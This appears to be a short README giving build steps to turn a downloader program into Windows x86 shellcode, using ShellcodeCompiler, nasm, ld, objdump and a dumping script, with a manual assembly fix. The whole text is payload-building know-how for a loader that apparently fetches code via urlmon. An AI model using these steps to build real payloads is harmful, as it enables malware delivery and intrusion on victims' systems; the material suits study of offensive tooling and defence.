To create the payload we will make our lives easier by using the shellcode Compiler from: https://github.com/NytroRST/ShellcodeCompiler

Use it as follows:
 - gcc -m32 MainDownloader.c -o MainDownloader.exe -lurlmon

 - ./ShellcodeCompiler_x64.exe -r payload.cpp -a _assembly.asm -p win_x86
    * You must manually modify the assembly in order to fix it:
        + mov eax, fs:[ecx + 0x30]
        + mov eax, [fs:ecx + 0x30]
 - nasm -g -f win32 _assembly.asm -o _assembly.o
 - C:/MinGW/bin/ld.exe -g -mi386pe _assembly.o -o _assembly.exe

 - (Inside gitBash) Manually execute 'objdump -d _assembly.exe' and paste the result inside 'tmp.txt'
 - python dumpShellcode.py tmp.txt
